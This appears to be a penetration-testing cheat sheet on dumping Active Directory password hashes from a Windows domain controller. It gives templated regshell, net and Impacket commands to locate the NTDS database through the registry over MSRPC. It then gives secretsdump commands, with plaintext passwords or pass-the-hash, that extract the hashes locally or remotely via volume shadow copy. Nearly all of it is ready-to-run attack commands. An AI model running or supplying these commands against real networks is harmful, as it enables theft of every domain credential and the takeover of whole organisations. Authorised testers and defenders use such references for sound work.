# Unix Shell

Search Tag(s): #post-exploitation #credential-access-and-dumping #network-protocols #msrpc #smb #staying-off-the-land #windows

## 01 - Enumerate Registry Files

### 1.1 - MSRPC Network Protocol

#### 1.1.1 - `regshell`

Authentication syntax.

```
$ regshell -U "[<domain>/]<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>
```

Navigate to the subkey and `print` the information.

```
\> predef HKEY_LOCAL_MACHINE
\HKEY_LOCAL_MACHINE> ck SYSTEM\CurrentControlSet\Services\NTDS\Parameters
\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters> info

\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters> print "DSA Database file"
```

#### 1.1.2 - `net`

```
$ net <ads | rpc> registry getvalue "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" "DSA Database file" -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> registry getvalue "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" "DSA Database file" -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

#### 1.1.3 - Impacket

```
$ reg.py "<username>":"<password>"@<IP> query -keyName "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
```

## 02 - Extract Shadow File

TODO: Demonstrate using smbclient to download hashes

```
$ secretsdump -system /path/to/SYSTEM -ntds /path/to/NTDS.dit local
```

```
$ secretsdump.py "[<domain>/]<username>":"<password>"@<IP> -use-vss

$ secretsdump.py "[<domain>/]<username>"@<IP> -hashes :<nt_hash> -use-vss
```

---
## References

- [Pentestlab: Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)